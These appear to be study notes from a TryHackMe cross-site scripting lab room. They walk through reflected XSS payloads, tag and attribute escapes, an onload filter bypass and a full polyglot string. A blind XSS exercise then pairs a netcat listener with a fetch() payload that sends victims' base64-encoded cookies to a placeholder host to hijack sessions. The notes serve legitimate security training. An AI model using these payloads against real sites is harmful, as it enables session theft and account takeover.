---
URL: https://tryhackme.com/room/xss
---
## Perfecting your payload
### Level One:

You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:

![[XSS L1 Web.png]]

If you view the Page Source, You'll see your name reflected in the code:

![[XSS L1 Source.png]]

Instead of entering your name, we're instead going to try entering the following JavaScript Payload: `<script>alert('THM');</script>`.

Now when you click the enter button, you'll get an alert popup with the string THM and the page source will look like the following:

![[XSS L1 THM.png]]

### Level Two:

Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:

![[XSS L2 Web.png]]

Viewing the page source, you can see your name reflected inside the value attribute of the input tag:

![[XSS L2 Source.png]]

It wouldn't work if you were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to *escape the input tag* first so the payload can run properly. You can do this with the following payload: 
`"><script>alert('THM');</script>`

The important part of the payload is the `">` which closes the value parameter and then closes the input tag.

This now closes the input tag properly and allows the JavaScript payload to run:

![[XSS L2 THM.png]]

### Level Six:

Similar to level two, where we had to escape from the value attribute of an input tag, we can try `"><script>alert('THM');</script>` , but that doesn't seem to work. Let's inspect the page source to see why that doesn't work.

![[XSS L6 Source.png]]

You can see that the `<` and `>` characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the `onload` event. The `onload` event executes the code of your choosing once the image specified in the src attribute has loaded onto the web page.

Let's change our payload to reflect this `/images/cat.jpg" onload="alert('THM');` and then viewing the page source, and you'll see how this will work.

![[XSS L6 THM.png]]

### Polyglots

An XSS polyglot is a string of text which can *escape attributes, tags and bypass filters all in one*. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## Practical Example (Blind XSS)

Create a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You'll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket. 

Upon viewing the page source, we can see the text gets placed inside a textarea tag.

![[Blind XSS Prac.png]]

If we create another new ticket with the following payload: 
`</textarea><script>alert('THM');</script>` 

Now when we view the ticket, we get an alert box with the string THM. Expanding on this vulnerability we are going to *extract from another user their cookies*, which we could use to elevate our privileges by *hijacking their login session*. 

To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly, we'll need to set up a listening server to receive the information.

Let’s set up a listening server using [[Netcat]]. If we want to listen on port `9001`, we issue the command `nc -l -p 9001`. 

The `-l` option indicates that we want to use Netcat in listen mode, while the 
`-p` option is used to specify the port number. 
To avoid the resolution of hostnames via DNS, we can add `-n`; 
moreover, to discover any errors, running Netcat in verbose mode by adding the `-v` option is recommended. 

The final command becomes `nc -n -l -v -p 9001`, equivalent to `nc -nlvp 9001`.

Now that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.

```javascript
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```

Let’s break down the payload:

- The `</textarea>` tag closes the text area field.
- The `<script>` tag opens an area for us to write JavaScript.
- The` fetch()` command makes an HTTP request.
- `URL_OR_IP` is the IP address the data will be exfiltrated to.
- `PORT_NUMBER` is the port number we are running the netcat server on
- `?cookie=` is the query string containing the victim’s cookies.
- `btoa()` command base64 encodes the victim’s cookies.
- `document.cookie` accesses the victim’s cookies for the Acme IT Support Website.
- `</script>` closes the JavaScript code block.

Now after we submit a support ticket with the above payload, when a staff member opens it, we should get their cookie on our Netcat server.

![[XSS Netcat catch.png]]

Then we can use a base64 decoder to decode it.